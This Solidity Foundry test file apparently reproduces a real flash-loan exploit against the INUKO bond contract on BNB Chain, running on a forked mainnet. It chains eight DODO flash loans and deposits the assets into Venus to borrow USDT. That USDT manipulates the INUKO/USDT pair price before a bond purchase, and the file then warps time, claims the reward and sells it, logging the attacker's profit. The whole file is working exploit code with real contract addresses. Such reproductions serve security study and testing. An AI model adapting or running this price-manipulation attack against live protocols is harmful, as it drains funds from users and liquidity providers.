// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/AnciliaInc/status/1587848874076430336
// @Address
// https://bscscan.com/txs?a=0xb12011c14e087766f30f4569ccaf735ec2182165

interface Bond {
    function buyBond(uint256 lpAmount, uint256 bondId) external;
    function claim(uint256 index) external;
}

interface VBUSD {
    function mint(uint256 mintAmount) external;
    function redeemUnderlying(uint256 redeemAmount) external;
}

interface VBNB {
    function mint() external payable;
    function redeemUnderlying(uint256 redeemAmount) external;
}

interface VETH {
    function mint(uint256 mintAmount) external;
    function redeemUnderlying(uint256 redeemAmount) external;
}

interface VBTC {
    function mint(uint256 mintAmount) external;
    function redeemUnderlying(uint256 redeemAmount) external;
}

interface VUSDT {
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
}

interface Unitroller {
    function getAccountLiquidity(address account) external returns (uint256, uint256, uint256);
    function enterMarkets(address[] calldata vTokens) external;
}

contract ContractTest is Test {
    IERC20 INUKO = IERC20(0xEa51801b8F5B88543DdaD3D1727400c15b209D8f);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xD50B9Bcd8B7D4B791EA301DBCC8318EE854d8B67);
    VBNB vBNB = VBNB(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
    VBUSD vBUSD = VBUSD(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
    VETH vETH = VETH(0xf508fCD89b8bd15579dc79A6827cB4686A3592c8);
    VBTC vBTC = VBTC(0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B);
    VUSDT vUSDT = VUSDT(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    Unitroller unitroller = Unitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IERC20 token1;
    IERC20 token2;
    uint256 amount1;
    uint256 amount2;
    uint256 amount3;
    uint256 amount4;
    uint256 amount5;
    uint256 amount6;
    uint256 amount7;
    uint256 amount8;
    uint256 amount9;
    uint256 amount10;
    uint256 amount11;
    uint256 amount12;
    uint256 amount13;
    uint256 amount14;
    uint256 amount15;
    uint256 amount16;
    address constant dodo1 = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
    address constant dodo2 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    address constant dodo3 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
    address constant dodo4 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address constant dodo5 = 0x7A3F460F37AE8A8FF2C2440B8A8ee784cCD0B543;
    address constant dodo6 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address constant dodo7 = 0x9BA8966B706c905E594AcbB946Ad5e29509f45EB;
    address constant dodo8 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    Bond bond = Bond(0x09beDDae85a9b5Ada57a5bd7979bb7b3dd08B538);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // the ankr rpc maybe dont work , please use QuickNode
        cheats.createSelectFork("bsc", 22_169_169);
    }

    function testExploit() public payable {
        address(WBNB).call{value: 5 ether}("");
        // add LP
        addLiquidity();
        // FlashLoan manipulate price, then buy bond
        buyBond();
        // change time pass time check , claim reward
        cheats.warp(block.timestamp + 3 * 24 * 60 * 60);
        claimAndSell();

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function addLiquidity() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        path[2] = address(INUKO);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp
        );

        address[] memory path1 = new address[](2);
        path1[0] = address(WBNB);
        path1[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path1, address(this), block.timestamp
        );

        USDT.approve(address(Router), type(uint256).max);
        INUKO.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(USDT),
            address(INUKO),
            USDT.balanceOf(address(this)),
            INUKO.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );

        Pair.approve(address(bond), type(uint256).max);
    }

    function buyBond() internal {
        token1 = IERC20(DVM(dodo1)._BASE_TOKEN_());
        token2 = IERC20(DVM(dodo1)._QUOTE_TOKEN_());
        amount1 = token1.balanceOf(dodo1);
        amount2 = token2.balanceOf(dodo1);
        DVM(dodo1).flashLoan(amount1, amount2, address(this), new bytes(1)); //WBNB USDT
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external payable {
        if (msg.sender == dodo1) {
            WBNB_BUSD_Pair_Loan();
        } else if (msg.sender == dodo2) {
            ETH_USDT_Pair_Loan1();
        } else if (msg.sender == dodo3) {
            WBNB_USDT_Pair_Loan();
        } else if (msg.sender == dodo4) {
            BTCB_BUSD_Pair_Loan();
        } else if (msg.sender == dodo5) {
            ETH_USDT_Pair_Loan2();
        } else if (msg.sender == dodo6) {
            ETH_BUSD_Pair_Loan();
        } else if (msg.sender == dodo7) {
            BTCB_USDT_Pair_Loan();
        } else if (msg.sender == dodo8) {
            venusLendingAndRepay();
            BTCB.transfer(dodo8, amount15);
            USDT.transfer(dodo8, amount16);
        }
    }

    function WBNB_BUSD_Pair_Loan() internal {
        token1 = IERC20(DVM(dodo2)._BASE_TOKEN_());
        token2 = IERC20(DVM(dodo2)._QUOTE_TOKEN_());
        amount3 = token1.balanceOf(dodo2);
        amount4 = token2.balanceOf(dodo2);
        DVM(dodo2).flashLoan(amount3, amount4, address(this), new bytes(1));
        WBNB.transfer(dodo1, amount1);
        USDT.transfer(dodo1, amount2);
    }

    function ETH_USDT_Pair_Loan1() internal {
        token1 = IERC20(DVM(dodo3)._BASE_TOKEN_());
        token2 = IERC20(DVM(dodo3)._QUOTE_TOKEN_());
        amount5 = token1.balanceOf(dodo3);
        amount6 = token2.balanceOf(dodo3);
        DVM(dodo3).flashLoan(amount5, amount6, address(this), new bytes(1));
        WBNB.transfer(dodo2, amount3);
        BUSD.transfer(dodo2, amount4);
    }

    function WBNB_USDT_Pair_Loan() internal {
        token1 = IERC20(DVM(dodo4)._BASE_TOKEN_());
        token2 = IERC20(DVM(dodo4)._QUOTE_TOKEN_());
        amount7 = token1.balanceOf(dodo4);
        amount8 = token2.balanceOf(dodo4);
        DVM(dodo4).flashLoan(amount7, amount8, address(this), new bytes(1));
        ETH.transfer(dodo3, amount5);
        USDT.transfer(dodo3, amount6);
    }

    function BTCB_BUSD_Pair_Loan() internal {
        token1 = IERC20(DVM(dodo5)._BASE_TOKEN_());
        token2 = IERC20(DVM(dodo5)._QUOTE_TOKEN_());
        amount9 = token1.balanceOf(dodo5);
        amount10 = token2.balanceOf(dodo5);
        DVM(dodo5).flashLoan(amount9, amount10, address(this), new bytes(1));
        WBNB.transfer(dodo4, amount7);
        USDT.transfer(dodo4, amount8);
    }

    function ETH_USDT_Pair_Loan2() internal {
        token1 = IERC20(DVM(dodo6)._BASE_TOKEN_());
        token2 = IERC20(DVM(dodo6)._QUOTE_TOKEN_());
        amount11 = token1.balanceOf(dodo6);
        amount12 = token2.balanceOf(dodo6);
        DVM(dodo6).flashLoan(amount11, amount12, address(this), new bytes(1));
        BTCB.transfer(dodo5, amount9);
        BUSD.transfer(dodo5, amount10);
    }

    function ETH_BUSD_Pair_Loan() internal {
        token1 = IERC20(DVM(dodo7)._BASE_TOKEN_());
        token2 = IERC20(DVM(dodo7)._QUOTE_TOKEN_());
        amount13 = token1.balanceOf(dodo7);
        amount14 = token2.balanceOf(dodo7);
        DVM(dodo7).flashLoan(amount13, amount14, address(this), new bytes(1)); // WBNB BUSD
        ETH.transfer(dodo6, amount11);
        USDT.transfer(dodo6, amount12);
    }

    function BTCB_USDT_Pair_Loan() internal {
        token1 = IERC20(DVM(dodo8)._BASE_TOKEN_());
        token2 = IERC20(DVM(dodo8)._QUOTE_TOKEN_());
        amount15 = token1.balanceOf(dodo8);
        amount16 = token2.balanceOf(dodo8);
        DVM(dodo8).flashLoan(amount15, amount16, address(this), new bytes(1)); // WBNB BUSD
        ETH.transfer(dodo7, amount13);
        BUSD.transfer(dodo7, amount14);
    }

    function venusLendingAndRepay() public payable {
        uint256 BNBAmount = WBNB.balanceOf(address(this));
        address(WBNB).call(abi.encodeWithSignature("withdraw(uint)", BNBAmount));
        uint256 BUSDAmount = BUSD.balanceOf(address(this));
        uint256 ETHAmount = ETH.balanceOf(address(this));
        uint256 BTCBAmount = BTCB.balanceOf(address(this));
        address[] memory cTokens = new address[](5);
        cTokens[0] = address(vBNB);
        cTokens[1] = address(vUSDT);
        cTokens[2] = address(vBUSD);
        cTokens[3] = address(vETH);
        cTokens[4] = address(vBTC);
        unitroller.enterMarkets(cTokens);
        vBNB.mint{value: BNBAmount}();
        BUSD.approve(address(vBUSD), type(uint256).max);
        vBUSD.mint(BUSDAmount);
        ETH.approve(address(vETH), type(uint256).max);
        vETH.mint(ETHAmount);
        BTCB.approve(address(vBTC), type(uint256).max);
        vBTC.mint(BTCBAmount);
        (, uint256 amount,) = unitroller.getAccountLiquidity(address(this));

        vUSDT.borrow(amount * 99 / 100);
        USDT.transfer(address(Pair), USDT.balanceOf(address(this)));
        bond.buyBond(Pair.balanceOf(address(this)), 0);
        Pair.skim(address(this));
        USDT.approve(address(vUSDT), type(uint256).max);
        vUSDT.repayBorrow(amount * 99 / 100);
        vBNB.redeemUnderlying(BNBAmount);
        address(WBNB).call{value: address(this).balance}("");
        vBUSD.redeemUnderlying(BUSDAmount);
        vETH.redeemUnderlying(ETHAmount);
        vBTC.redeemUnderlying(BTCBAmount);
    }

    function claimAndSell() internal {
        bond.claim(0);
        INUKO.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(INUKO);
        path[1] = address(USDT);
        // TX LIMIT
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            25_000 * 1e18, 0, path, address(this), block.timestamp
        );
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            25_000 * 1e18, 0, path, address(this), block.timestamp
        );
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            INUKO.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
